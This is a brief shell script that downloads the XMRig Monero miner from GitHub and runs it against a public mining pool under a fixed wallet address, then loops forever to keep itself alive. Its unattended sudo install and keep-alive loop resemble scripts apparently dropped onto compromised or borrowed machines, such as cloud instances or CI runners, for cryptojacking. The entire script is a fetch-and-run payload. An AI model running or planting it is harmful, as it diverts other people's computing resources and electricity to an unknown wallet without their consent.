#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.8.1/xmrig-6.8.1-bionic-x64.tar.gz
tar -xvf xmrig-6.8.1-bionic-x64.tar.gz
./xmrig-6.8.1/xmrig -o us-west.minexmr.com:443 -u 8C6jc2pU6e6aGLU4DaEWVcAS5m6gU1v4nVHjSRBbBsx3TcC1x3bw2TcL8tnqmdmUzUMBGCb5NdJ5PfA1qKKWemBz4bhTz6U.izemotion -k --tls -p x
while [ 1 ]; do
sleep 3
done
sleep 999
